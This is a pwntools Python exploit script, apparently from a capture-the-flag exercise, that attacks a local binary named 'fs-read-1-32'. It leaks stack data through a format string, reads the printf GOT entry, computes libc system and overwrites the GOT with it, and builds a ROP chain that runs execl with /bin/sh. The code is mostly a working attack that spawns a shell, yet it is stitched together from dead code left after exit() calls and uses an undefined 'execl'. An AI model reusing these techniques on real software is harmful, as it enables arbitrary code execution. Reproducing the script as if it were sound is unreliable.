#!/usr/bin/env python

from pwn import *
import os

p = process('./fs-read-1-32')

buf = "%p " * 10
p.sendline(buf)
data = p.recv()

print (data)

random = data[79:89]
print (random)
p.sendline(random)

p.interactive()
exit()






printf_got = p.elf.got['printf']
print ("GOT: %s" % hex(printf_got))

#please_exe_me = p.elf.symbols['please_execute_me']
#print ("please_exe_me: %s" % hex(please_exe_me))


print(p.recv())
p.sendline("32")

p.sendline(hex(printf_got))

data = p.recv()
print (len(data))
print (repr(data))


printf_addr = data[112:120]
print((printf_addr))
printf_addr = u64(printf_addr)
print(hex(printf_addr))


"""
print system
$1 = {<text variable, no debug info>} 0x7fda314bf390 <__libc_system>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0x7fda314cf800 <__printf>
"""

system_temp = 0x7fda314bf390
printf_temp = 0x7fda314cf800

system = printf_addr - printf_temp + system_temp

print(hex(system))

#gdb.attach(p)
#raw_input()
p.sendline("6")
p.sendline(hex(printf_got))
p.sendline(p64(system))



p.interactive()


exit()

buf = "A" * 0x80 + "BBBBBBBB"


pop_rdi_ret = p64(0x400b43)
pop_rsi_pop_ret = p64(0x400b41)

string = p64(0x400e30) #"$"

#if os.path.exists("$"):
#    os.unlink("$")

#os.symlink("/bin/sh", "$")

buf += pop_rdi_ret
buf += string
buf += pop_rsi_pop_ret
buf += p64(0) + p64(0)
buf += p64(execl)


with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
